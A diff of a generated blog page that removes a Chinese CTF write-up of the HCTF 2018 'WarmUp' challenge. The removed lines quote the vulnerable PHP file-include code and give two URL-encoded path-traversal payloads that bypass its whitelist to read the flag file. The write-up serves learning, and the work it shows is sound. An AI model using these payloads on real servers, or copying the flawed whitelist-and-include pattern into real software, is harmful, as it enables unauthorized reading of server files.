class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">emmm</span></span></span><br><span class="line"><span class="class">    </span>&#123;</span><br><span class="line">        <span class="keyword">public</span> <span class="built_in">static</span> <span class="function"><span class="keyword">function</span> <span class="title">checkFile</span>(<span class="params">&amp;$page</span>)</span></span><br><span class="line"><span class="function">        </span>&#123;</span><br><span class="line">            $whitelist = [<span class="string">&quot;source&quot;</span>=&gt;<span class="string">&quot;source.php&quot;</span>,<span class="string">&quot;hint&quot;</span>=&gt;<span class="string">&quot;hint.php&quot;</span>];</span><br><span class="line">            <span class="keyword">if</span> (! <span class="keyword">isset</span>($page) || !is_string($page)) &#123;</span><br><span class="line">                <span class="keyword">echo</span> <span class="string">&quot;you can&#x27;t see it&quot;</span>;</span><br><span class="line">                <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> (in_array($page, $whitelist)) &#123;</span><br><span class="line">                <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            $_page = mb_substr(</span><br><span class="line">                $page,</span><br><span class="line">                <span class="number">0</span>,</span><br><span class="line">                mb_strpos($page . <span class="string">&#x27;?&#x27;</span>, <span class="string">&#x27;?&#x27;</span>)</span><br><span class="line">            );</span><br><span class="line">            <span class="keyword">if</span> (in_array($_page, $whitelist)) &#123;</span><br><span class="line">                <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            $_page = urldecode($page);</span><br><span class="line">            $_page = mb_substr(</span><br><span class="line">                $_page,</span><br><span class="line">                <span class="number">0</span>,</span><br><span class="line">                mb_strpos($_page . <span class="string">&#x27;?&#x27;</span>, <span class="string">&#x27;?&#x27;</span>)</span><br><span class="line">            );</span><br><span class="line">            <span class="keyword">if</span> (in_array($_page, $whitelist)) &#123;</span><br><span class="line">                <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;you can&#x27;t see it&quot;</span>;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (! <span class="keyword">empty</span>($_REQUEST[<span class="string">&#x27;file&#x27;</span>])</span><br><span class="line">        &amp;&amp; is_string($_REQUEST[<span class="string">&#x27;file&#x27;</span>])</span><br><span class="line">        &amp;&amp; emmm::checkFile($_REQUEST[<span class="string">&#x27;file&#x27;</span>])</span><br><span class="line">    ) &#123;</span><br><span class="line">        <span class="keyword">include</span> $_REQUEST[<span class="string">&#x27;file&#x27;</span>];</span><br><span class="line">        <span class="keyword">exit</span>;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;&lt;br&gt;&lt;img src=\&quot;https://i.loli.net/2018/11/01/5bdb0d93dc794.jpg\&quot; /&gt;&quot;</span>;</span><br><span class="line">    &#125;  </span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
-
-<blockquote>
-<p><em>到目前为止还没有看到过这么长的代码审计（菜\</em>2）*</p>
-</blockquote>
-<p>先看与file有关的代码：</p>
-<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (! <span class="keyword">empty</span>($_REQUEST[<span class="string">&#x27;file&#x27;</span>])</span><br><span class="line">        &amp;&amp; is_string($_REQUEST[<span class="string">&#x27;file&#x27;</span>])</span><br><span class="line">        &amp;&amp; emmm::checkFile($_REQUEST[<span class="string">&#x27;file&#x27;</span>])</span><br><span class="line">    ) &#123;</span><br><span class="line">        <span class="keyword">include</span> $_REQUEST[<span class="string">&#x27;file&#x27;</span>];</span><br><span class="line">        <span class="keyword">exit</span>;</span><br></pre></td></tr></table></figure>
-
-<p>file要求是字符串且不为空，用emmm中的checkFile调用。file中的值传递给了page。checkFile中四个if语句，每个都有return。</p>
-<h6 id="第一个if："><a href="#第一个if：" class="headerlink" title="第一个if："></a>第一个if：</h6><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">$whitelist = [<span class="string">&quot;source&quot;</span>=&gt;<span class="string">&quot;source.php&quot;</span>,<span class="string">&quot;hint&quot;</span>=&gt;<span class="string">&quot;hint.php&quot;</span>];</span><br><span class="line">            <span class="keyword">if</span> (! <span class="keyword">isset</span>($page) || !is_string($page)) &#123;</span><br><span class="line">                <span class="keyword">echo</span> <span class="string">&quot;you can&#x27;t see it&quot;</span>;</span><br><span class="line">                <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">            &#125;</span><br></pre></td></tr></table></figure>
-
-<p>先设置了一个白名单数组，准许访问source.php和hint.php，hint.php中存放了flag的位置。第一个if语句要求page存在且为字符串，不符合则return false，退出程序。</p>
-<h6 id="第二个if："><a href="#第二个if：" class="headerlink" title="第二个if："></a>第二个if：</h6><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (in_array($page, $whitelist)) &#123;</span><br><span class="line">                <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">            &#125;</span><br></pre></td></tr></table></figure>
-
-<p>in_array()函数在page中查找是否有与whitelist中键值对应的字符串。有则return true，退出程序。</p>
-<h6 id="第三个if："><a href="#第三个if：" class="headerlink" title="第三个if："></a>第三个if：</h6><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">$_page = mb_substr(</span><br><span class="line">                $page,</span><br><span class="line">                <span class="number">0</span>,</span><br><span class="line">                mb_strpos($page . <span class="string">&#x27;?&#x27;</span>, <span class="string">&#x27;?&#x27;</span>)</span><br><span class="line">            );</span><br><span class="line">            <span class="keyword">if</span> (in_array($_page, $whitelist)) &#123;</span><br><span class="line">                <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">            &#125;</span><br></pre></td></tr></table></figure>
-
-<p>mb_strpos为page拼接了一个？，并返回其**<em>第一次出现的位置**</em>。mb_substr从开头显示字符至？所在的位置，处理后page再次进行比对。</p>
-<blockquote>
-<p><em>那不是只能读source.php了？……$_page啊，那没事了……（菜\</em>3）*</p>
-</blockquote>
-<h6 id="第四个if："><a href="#第四个if：" class="headerlink" title="第四个if："></a>第四个if：</h6><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">$_page = urldecode($page);</span><br><span class="line">            $_page = mb_substr(</span><br><span class="line">                $_page,</span><br><span class="line">                <span class="number">0</span>,</span><br><span class="line">                mb_strpos($_page . <span class="string">&#x27;?&#x27;</span>, <span class="string">&#x27;?&#x27;</span>)</span><br><span class="line">            );</span><br><span class="line">            <span class="keyword">if</span> (in_array($_page, $whitelist)) &#123;</span><br><span class="line">                <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;you can&#x27;t see it&quot;</span>;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">false</span>;</span><br></pre></td></tr></table></figure>
-
-<p>先对page进行了url编码，再进行读取和对比的操作……</p>
-<p><strong><em>注意：PHP中$_GET、$_POST、$_REQUEST这类函数在提取参数值时会URL解码一次</em></strong></p>
-<p><em><a target="_blank" rel="noopener" href="https://www.cnblogs.com/yesec/p/12635274.html">这位师傅</a>上面写第三个if不能利用，但逻辑理通之后我感觉也是可以利用的。</em></p>
-<p>?一次编码为%3F，二次编码为%253F，那么第三个if的利用需要if的一次编码。</p>
-<h5 id="第三个if利用："><a href="#第三个if利用：" class="headerlink" title="第三个if利用："></a>第三个if利用：</h5><p><strong><em>payload：?file=source.php%3F../../../../../../ffffllllaaaagggg</em></strong>（服务器找不到source.php%3F，就视为一个文件夹）</p>
-<p><img src="/images/5-HCTF-2018-WarmUp/image-20201201140413227.png" alt="image-20201201140413227"></p>
-<p>成功出flag</p>
-<h5 id="第四个if利用："><a href="#第四个if利用：" class="headerlink" title="第四个if利用："></a>第四个if利用：</h5><p>自然，需要二次编码的’?‘。</p>
-<p><strong><em>payload：?file=source.php%253F../../../../../../ffffllllaaaagggg</em></strong></p>
-<p><img src="/images/5-HCTF-2018-WarmUp/image-20201201140836595.png" alt="image-20201201140836595"></p>
-<blockquote>
-<p>总算做了点实在事……</p>
-</blockquote>
-<h3 id="知识点总结："><a href="#知识点总结：" class="headerlink" title="知识点总结："></a>知识点总结：</h3><ul>
-<li><a target="_blank" rel="noopener" href="https://www.cnblogs.com/yesec/p/12635274.html">这位师傅不错呦</a></li>
-<li><a target="_blank" rel="noopener" href="https://www.w3school.com.cn/php/func_array_in_array.asp">in_array() 函数搜索数组中是否存在指定的值</a></li>
-<li>mb_substr() 函数返回字符串的一部分， substr() 函数只针对英文字符，如果要分割的中文文字则需要使用 mb_substr()。</li>
-<li>mb_strpos() 查找字符串在另一个字符串中首次出现的位置，mb_strpos 按字处理，strpos 按字符处理。</li>
-</ul>
-<blockquote>
-<p><em>补充</em>：<a target="_blank" rel="noopener" href="https://www.feiniaomy.com/post/388.html">https://www.feiniaomy.com/post/388.html</a></p>
-</blockquote>
-<ul>
-<li>关于路径符号的一些知识。</li>
-<li>服务器找不到XXXXXXX，就视为一个文件夹。</li>
-</ul>
-
-      
-    </div>
-
-    
-    
-    
-      <footer class="post-footer">
-        <div class="post-eof"></div>
-      </footer>
-  </article>
-  
-  
-  
-
 
   
   <nav class="pagination">
@@ -1081,7 +1098,7 @@
       <div class="site-state-item site-state-posts">
           <a href="/archives/">
         
-          <span class="site-state-item-count">72</span>
+          <span class="site-state-item-count">78</span>
           <span class="site-state-item-name">日志</span>
         </a>
       </div>
